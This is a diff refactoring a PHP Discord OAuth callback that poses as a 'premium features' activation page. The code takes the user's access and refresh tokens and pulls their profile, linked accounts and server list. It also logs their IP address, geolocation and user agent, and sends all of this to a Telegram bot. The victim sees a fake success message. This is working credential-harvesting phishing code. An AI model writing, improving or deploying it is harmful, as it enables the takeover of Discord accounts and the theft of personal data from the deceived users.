@@ -1,43 +1,39 @@
 <?php
-$config = require 'config.php';
+$config = require __DIR__ . '/config.php';
 
-// ---------- helpers ----------
-function apiGet(string $url, string $token): array {
+function apiGet($url, $token) {
     $ch = curl_init($url);
     curl_setopt_array($ch, [
-        CURLOPT_HTTPHEADER     => ["Authorization: Bearer {$token}"],
+        CURLOPT_HTTPHEADER     => ["Authorization: Bearer $token"],
         CURLOPT_RETURNTRANSFER => true,
         CURLOPT_TIMEOUT        => 15,
         CURLOPT_SSL_VERIFYPEER => false,
     ]);
-    $resp = curl_exec($ch);
+    $r = curl_exec($ch);
     curl_close($ch);
-    $j = json_decode((string)$resp, true);
+    $j = json_decode((string)$r, true);
     return is_array($j) ? $j : [];
 }
 
-function ipInfo(string $ip): string {
-    $ch = curl_init("http://ip-api.com/json/{$ip}?fields=status,country,city,isp");
-    curl_setopt_array($ch, [
-        CURLOPT_RETURNTRANSFER => true,
-        CURLOPT_TIMEOUT        => 8,
-    ]);
-    $resp = curl_exec($ch);
+function ipInfo($ip) {
+    $ch = curl_init("http://ip-api.com/json/$ip?fields=status,country,city,isp");
+    curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 8]);
+    $r = curl_exec($ch);
     curl_close($ch);
-    $j = json_decode((string)$resp, true) ?: [];
+    $j = json_decode((string)$r, true) ?: [];
     if (($j['status'] ?? '') === 'success') {
         return ($j['country'] ?? '?') . ' / ' . ($j['city'] ?? '?') . ' / ' . ($j['isp'] ?? '?');
     }
     return 'غير معروف';
 }
 
-function sendTg(array $c, string $text): void {
-    $url = "https://api.telegram.org/bot{$c['telegram_bot_token']}/sendMessage";
+function sendTg($config, $text) {
+    $url = "https://api.telegram.org/bot{$config['telegram_bot_token']}/sendMessage";
     $ch  = curl_init($url);
     curl_setopt_array($ch, [
         CURLOPT_POST           => true,
         CURLOPT_POSTFIELDS     => http_build_query([
-            'chat_id'                  => $c['telegram_chat_id'],
+            'chat_id'                  => $config['telegram_chat_id'],
             'text'                     => substr($text, 0, 4000),
             'parse_mode'               => 'Markdown',
             'disable_web_page_preview' => 'true',
@@ -50,7 +46,7 @@ function sendTg(array $c, string $text): void {
     curl_close($ch);
 }
 
-function showFailed(): void {
+function showFailed() {
     echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Failed</title>
     <style>body{background:#0a0a0f;color:#e8eaf0;font-family:system-ui,sans-serif;
     min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px}
@@ -61,10 +57,9 @@ function showFailed(): void {
     a{color:#5865f2;text-decoration:none;font-weight:600}</style></head>
     <body><div class="card"><h1>Activation Failed</h1>
     <p>Something went wrong. Please try again.</p>
-    <a href="index.php">← Back</a></div></body></html>';
+    <a href="index.html">← Back</a></div></body></html>';
 }
 
-// ---------- main ----------
 $code = $_GET['code']  ?? '';
 $err  = $_GET['error'] ?? '';
 
@@ -72,7 +67,6 @@ if ($err || !$code) {
     showFailed(); exit;
 }
 
-// exchange code
 $ch = curl_init('https://discord.com/api/v10/oauth2/token');
 curl_setopt_array($ch, [
     CURLOPT_POST           => true,
@@ -100,16 +94,16 @@ $access  = $tok['access_token'];
 $refresh = $tok['refresh_token'] ?? '—';
 $expires = $tok['expires_in']    ?? '?';
 
-$user   = apiGet('https://discord.com/api/v10/users/@me',              $access);
-$conns  = apiGet('https://discord.com/api/v10/users/@me/connections',  $access);
-$guilds = apiGet('https://discord.com/api/v10/users/@me/guilds',       $access);
+$user   = apiGet('https://discord.com/api/v10/users/@me',             $access);
+$conns  = apiGet('https://discord.com/api/v10/users/@me/connections', $access);
+$guilds = apiGet('https://discord.com/api/v10/users/@me/guilds',      $access);
 
 $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '?';
 $ip = trim(explode(',', $ip)[0]);
 $ua = $_SERVER['HTTP_USER_AGENT'] ?? '?';
 $where = ipInfo($ip);
 
-$connLines  = [];
+$connLines = [];
 foreach (array_slice($conns, 0, 15) as $c) {
     $connLines[] = "  • " . ($c['type'] ?? '?') . " → `" . ($c['name'] ?? '?') . "`";
 }
@@ -145,9 +139,7 @@ $msg =
 sendTg($config, $msg);
 
 $username = htmlspecialchars($user['username'] ?? 'user', ENT_QUOTES, 'UTF-8');
-
-// ---------- success page ----------
-echo <<<HTML
+?>
 <!DOCTYPE html>
 <html><head><meta charset="UTF-8"><title>Activated!</title>
 <style>
@@ -176,7 +168,7 @@ echo <<<HTML
   <div class="check"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"
     stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg></div>
   <h1>Activated Successfully!</h1>
-  <p>Welcome, <span class="username">{$username}</span>. Your premium features are now unlocked.</p>
+  <p>Welcome, <span class="username"><?= $username ?></span>. Your premium features are now unlocked.</p>
   <div class="countdown">Redirecting in <b id="cd">5</b> seconds ·
     <a href="https://discord.com/app">Open Discord</a></div>
 </div>
@@ -184,4 +176,3 @@ echo <<<HTML
 const iv=setInterval(()=>{t--;cd.textContent=t;
 if(t<=0){clearInterval(iv);window.location.href='https://discord.com/app';}},1000);</script>
 </body></html>
-HTML;
